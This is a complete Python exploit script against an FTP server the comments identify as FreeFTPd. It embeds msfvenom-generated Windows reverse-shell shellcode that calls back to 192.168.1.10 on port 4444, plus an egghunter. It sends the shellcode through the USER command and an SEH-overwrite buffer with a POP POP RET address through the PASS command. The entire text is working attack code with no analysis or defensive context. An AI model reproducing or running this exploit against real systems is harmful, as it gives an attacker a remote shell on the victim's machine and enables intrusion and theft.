#!/usr/bin/python

import sys,os,struct,socket

host = '192.168.1.26'
port = 21

# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c -b '\x00\x0a\x0d' EXITFUNC=seh
# 351 bytes
shellcode = ("W00TW00T"
"\xd9\xec\xb8\xd9\xad\x71\x1b\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x52\x83\xc5\x04\x31\x45\x13\x03\x9c\xbe\x93\xee\xe2\x29\xd1"
"\x11\x1a\xaa\xb6\x98\xff\x9b\xf6\xff\x74\x8b\xc6\x74\xd8\x20"
"\xac\xd9\xc8\xb3\xc0\xf5\xff\x74\x6e\x20\xce\x85\xc3\x10\x51"
"\x06\x1e\x45\xb1\x37\xd1\x98\xb0\x70\x0c\x50\xe0\x29\x5a\xc7"
"\x14\x5d\x16\xd4\x9f\x2d\xb6\x5c\x7c\xe5\xb9\x4d\xd3\x7d\xe0"
"\x4d\xd2\x52\x98\xc7\xcc\xb7\xa5\x9e\x67\x03\x51\x21\xa1\x5d"
"\x9a\x8e\x8c\x51\x69\xce\xc9\x56\x92\xa5\x23\xa5\x2f\xbe\xf0"
"\xd7\xeb\x4b\xe2\x70\x7f\xeb\xce\x81\xac\x6a\x85\x8e\x19\xf8"
"\xc1\x92\x9c\x2d\x7a\xae\x15\xd0\xac\x26\x6d\xf7\x68\x62\x35"
"\x96\x29\xce\x98\xa7\x29\xb1\x45\x02\x22\x5c\x91\x3f\x69\x09"
"\x56\x72\x91\xc9\xf0\x05\xe2\xfb\x5f\xbe\x6c\xb0\x28\x18\x6b"
"\xb7\x02\xdc\xe3\x46\xad\x1d\x2a\x8d\xf9\x4d\x44\x24\x82\x05"
"\x94\xc9\x57\x89\xc4\x65\x08\x6a\xb4\xc5\xf8\x02\xde\xc9\x27"
"\x32\xe1\x03\x40\xd9\x18\xc4\xaf\xb6\x23\x1e\x58\xc5\x23\x0f"
"\xc4\x40\xc5\x45\xe4\x04\x5e\xf2\x9d\x0c\x14\x63\x61\x9b\x51"
"\xa3\xe9\x28\xa6\x6a\x1a\x44\xb4\x1b\xea\x13\xe6\x8a\xf5\x89"
"\x8e\x51\x67\x56\x4e\x1f\x94\xc1\x19\x48\x6a\x18\xcf\x64\xd5"
"\xb2\xed\x74\x83\xfd\xb5\xa2\x70\x03\x34\x26\xcc\x27\x26\xfe"
"\xcd\x63\x12\xae\x9b\x3d\xcc\x08\x72\x8c\xa6\xc2\x29\x46\x2e"
"\x92\x01\x59\x28\x9b\x4f\x2f\xd4\x2a\x26\x76\xeb\x83\xae\x7e"
"\x94\xf9\x4e\x80\x4f\xba\x71\x70\x5d\x57\xe5\x2b\x34\x1a\x6b"
"\xcc\xe3\x59\x92\x4f\x01\x22\x61\x4f\x60\x27\x2d\xd7\x99\x55"
"\x3e\xb2\x9d\xca\x3f\x97")

# 32 byte egghunter: W00T
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a"
"\x74\xef\xb8\x57\x30\x30\x54\x89\xd7\xaf\x75\xea\xaf\x75\xe7"
"\xff\xe7")

payload = ''
payload += '\x90' * (797 - len(egghunter))
payload += egghunter
payload += '\x90\x90\xeb\x80' # Jump back 128 bytes into nopsled
payload += struct.pack("<I",0x0047D0E6) # POP POP RET in FreeFTPdService.exe

# Stage 1: send egg reverse shell payload
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host,port))
sock.recv(1024)
sock.send("USER " + shellcode + "\r\n")
sock.recv(1024)
sock.close()

# Stage 2: send and execute egghunter
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host,port))
sock.recv(1024)
sock.send("USER anonymous\r\n")
sock.recv(1024)
sock.send("PASS " + payload + "\r\n")
sock.recv(1024)
sock.close()